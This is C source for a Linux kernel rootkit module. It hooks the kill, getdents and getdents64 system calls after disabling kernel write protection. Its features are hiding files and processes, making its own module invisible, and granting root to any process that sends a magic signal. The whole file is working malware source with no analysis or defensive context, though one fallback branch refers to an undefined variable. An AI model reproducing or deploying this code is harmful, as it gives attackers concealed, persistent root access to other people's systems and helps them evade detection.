#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <linux/dirent.h>
#include <linux/cred.h>
#include <linux/tcp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kacper Makowski");
MODULE_DESCRIPTION("Rootkit LKM");
MODULE_VERSION("1.0");


// SETTINGS //

#define NAME_TO_HIDE "hide"	//rootkit will hide files which names are started with NAME_TO_HIDE 
int show_dmesg = 0;			//initial messaging status (ON/OFF)
int module_hidden = 1;		//initial module status (hidden/unhidden)

enum signals{
    become_root = 64,
    toggle_module = 63,
    hide_process = 62,
    toggle_dmesg = 61,
};

// END OF SETTINGS //

unsigned long *__sys_call_table;

static struct list_head *module_previous;

char pid_to_hide[NAME_MAX];

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#endif

unsigned long *get_syscall_table(void){

	unsigned long *syscall_table;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
#else
    syscall_table = NULL;
#endif
	return syscall_table;
}

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
static ptregs_t orig_getdents;
static ptregs_t orig_getdents64;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
typedef asmlinkage long (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);

static orig_kill_t orig_kill;
static orig_getdents_t orig_getdents;
static orig_getdents64_t orig_getdents64;
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long hack_kill(const struct pt_regs *regs){
    pid_t pid = regs->di;
    int sig = regs->si;

    if (sig == become_root){
		void set_root(void);
        set_root();
        if (show_dmesg){printk(KERN_INFO "Rootkit: Signal %d - Becoming root\n", sig);}
        return 0;
    }
    else if (sig == toggle_module){
        void module_show(void);
        void module_hide(void);

        if (module_hidden){
            module_show();
            if (show_dmesg){printk(KERN_INFO "Rootkit: Signal %d - Showing module\n", sig);}
        }

        else{
            module_hide();
            if (show_dmesg){printk(KERN_INFO "Rootkit: Signal %d - Hiding module\n", sig);}
        }
        return 0;
	}

    else if (sig == toggle_dmesg){
        if (show_dmesg){
        printk(KERN_INFO "Rootkit: Signal %d - dmesg OFF\n", sig);
        show_dmesg = 0;
        }
        else{
        show_dmesg = 1;
        printk(KERN_INFO "Rootkit: Signal %d - dmesg ON\n", sig);
        }
        return 0;
    }

    else if (sig == hide_process){
        sprintf(pid_to_hide, "%d", pid);
        if (show_dmesg){printk(KERN_INFO "Rootkit: Signal %d - Hiding process (PID: %d) \n", sig, pid);}
        return 0;
    }

	return orig_kill(regs);
}

static asmlinkage long hack_getdents(const struct pt_regs *regs){
    struct linux_dirent{
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    long error;
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int result = orig_getdents(regs);
    dirent_ker = kzalloc(result, GFP_KERNEL);

    if ((result <= 0) || (dirent_ker == NULL)){
        return result;
	}

    error = copy_from_user(dirent_ker, dirent, result);
    if (error){
		kfree(dirent_ker);
		return result;
	}

    while (offset < result){
        current_dir = (void *)dirent_ker + offset;

        if ((memcmp(NAME_TO_HIDE, current_dir->d_name, strlen(NAME_TO_HIDE)) == 0) || ((memcmp(pid_to_hide, current_dir->d_name, strlen(pid_to_hide)) == 0) && (strncmp(pid_to_hide, "", NAME_MAX) != 0))){
            if ( current_dir == dirent_ker ){
                result -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, result);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else{
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, result);
    if (error){
		kfree(dirent_ker);
		return result;
	}

	kfree(dirent_ker);
    return result;
}

static asmlinkage long hack_getdents64(const struct pt_regs *regs){
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long error;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int result = orig_getdents64(regs);
    dirent_ker = kzalloc(result, GFP_KERNEL);

    if ((result <= 0) || (dirent_ker == NULL)){
        return result;
	}
    error = copy_from_user(dirent_ker, dirent, result);
    if (error){
		kfree(dirent_ker);
		return result;
	}

    while (offset < result){
        current_dir = (void *)dirent_ker + offset;

        if ((memcmp(NAME_TO_HIDE, current_dir->d_name, strlen(NAME_TO_HIDE)) == 0) || ((memcmp(pid_to_hide, current_dir->d_name, strlen(pid_to_hide)) == 0) && (strncmp(pid_to_hide, "", NAME_MAX) != 0))){
            if ( current_dir == dirent_ker ){
                result -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, result);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else{
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, result);
    if (error){
		kfree(dirent_ker);
		return result;
	}

	kfree(dirent_ker);
    return result;
}

#else
static asmlinkage long hack_kill(pid_t pid, int sig){

    if (sig == become_root){
		void set_root(void);
        set_root();
        if (show_dmesg){printk(KERN_INFO "Rootkit: Signal %d - Becoming root\n", sig);}
        return 0;
    }
    else if (sig == toggle_module){
        void module_show(void);
        void module_hide(void);

        if (module_hidden){
            module_show();
            if (show_dmesg){printk(KERN_INFO "Rootkit: Signal %d - Showing module\n", sig);}
        }

        else{
            module_hide();
            if (show_dmesg){printk(KERN_INFO "Rootkit: Signal %d - Hiding module\n", sig);}
        }
        return 0;
	}

    else if (sig == toggle_dmesg){
        if (show_dmesg){
        printk(KERN_INFO "Rootkit: Signal %d - dmesg OFF\n", sig);
        show_dmesg = 0;
        }
        else{
        show_dmesg = 1;
        printk(KERN_INFO "Rootkit: Signal %d - dmesg ON\n", sig);
        }
        return 0;
    }

    else if (sig == hide_process){

        sprintf(pid_to_hide, "%d", pid);
        if (show_dmesg){printk(KERN_INFO "Rootkit: Signal %d - Hiding process (PID: %d) \n", sig, pid);}
        return 0;
    }

	return orig_kill(regs);
}

static asmlinkage long hack_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){

    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int result = orig_getdents(fd, dirent, count);
    dirent_ker = kzalloc(result, GFP_KERNEL);

    if ((result <= 0) || (dirent_ker == NULL)){
        return result;
	}

    long error;
    error = copy_from_user(dirent_ker, dirent, result);
    if (error){
		kfree(dirent_ker);
		return result;
	}

    while (offset < result){
        current_dir = (void *)dirent_ker + offset;

        if ((memcmp(NAME_TO_HIDE, current_dir->d_name, strlen(NAME_TO_HIDE)) == 0) || ((memcmp(pid_to_hide, current_dir->d_name, strlen(pid_to_hide)) == 0) && (strncmp(pid_to_hide, "", NAME_MAX) != 0))){
            if ( current_dir == dirent_ker ){
                result -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, result);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else{
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, result);
    if (error){
		kfree(dirent_ker);
		return result;
	}

	kfree(dirent_ker);
    return result;
}

static asmlinkage long hack_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int result = orig_getdents64(fd, dirent, count);
    dirent_ker = kzalloc(result, GFP_KERNEL);

    if ((result <= 0) || (dirent_ker == NULL)){
        return result;
	}

    long error;
    error = copy_from_user(dirent_ker, dirent, result);

	if (error){
		kfree(dirent_ker);
		return result;
	}

    while (offset < result){
        current_dir = (void *)dirent_ker + offset;

        if ((memcmp(NAME_TO_HIDE, current_dir->d_name, strlen(NAME_TO_HIDE)) == 0) || ((memcmp(pid_to_hide, current_dir->d_name, strlen(pid_to_hide)) == 0) && (strncmp(pid_to_hide, "", NAME_MAX) != 0))){
            if ( current_dir == dirent_ker ){
                result -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, result);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else{
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, result);
    if (error){
		kfree(dirent_ker);
		return result;
	}

	kfree(dirent_ker);
    return result;
}

#endif


static int store_origs(void){
#ifdef PTREGS_SYSCALL_STUBS
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
    orig_getdents = (ptregs_t)__sys_call_table[__NR_getdents];
    orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];

#else
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
    orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];

#endif

    if (show_dmesg){printk(KERN_INFO "Rootkit: Stored originals \n");}
    return 0;
}

static int hook(void){
    __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
    __sys_call_table[__NR_getdents] = (unsigned long)&hack_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)&hack_getdents64;

    if (show_dmesg){printk(KERN_INFO "Rootkit: Functions hooked \n");}
    //if (show_dmesg){printk(KERN_INFO "Rootkit: Hiding files\n");}
    return 0;
}

static int unhook(void){
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;

    if (show_dmesg){printk(KERN_INFO "Rootkit: Functions unhooked \n");}
    //if (show_dmesg){printk(KERN_INFO "Rootkit: Unhiding files\n");}
    return 0;
}

static inline void write_cr0_forced(unsigned long val){
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void unprotect_memory(void){
    write_cr0_forced(read_cr0() & (~ 0x00010000));
    if (show_dmesg){printk(KERN_INFO "Rootkit: Memory unprotected \n");}
}

static void protect_memory(void){
    write_cr0_forced(read_cr0() | (0x00010000));
    if (show_dmesg){printk(KERN_INFO "Rootkit: Memory protected \n");}
}

void set_root(void){
    struct cred *root;
    root = prepare_creds();

    if (root == NULL){
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

void module_show(void){
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void module_hide(void){
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

static int __init Rootkit_init(void){
    int error = 1;
        if (show_dmesg){printk(KERN_INFO "Rootkit: Loaded \n");}

    __sys_call_table = get_syscall_table();

    if(!__sys_call_table){
        int error = 1;
        if (show_dmesg){printk(KERN_INFO "Rootkit: Can't access syscall_table \n");}
        return error;
    }

    if (store_origs() == error){
        if (show_dmesg){printk(KERN_INFO "Rootkit: Storaging error \n");}
    }

    unprotect_memory();

    if (hook() == error){
        if (show_dmesg){printk(KERN_INFO "Rootkit: Hooking error \n");}
    }

    protect_memory();

    if (module_hidden){
        module_hide();
    }

    return 0;
}

static void __exit Rootkit_exit(void){
    int error = 1;

    unprotect_memory();

    if (unhook() == error){
        if (show_dmesg){printk(KERN_INFO "Rootkit: Unhooking error \n");}
    }

    protect_memory();

    if (show_dmesg){printk(KERN_INFO "Rootkit: Unloaded \n");}
}

module_init(Rootkit_init);
module_exit(Rootkit_exit);
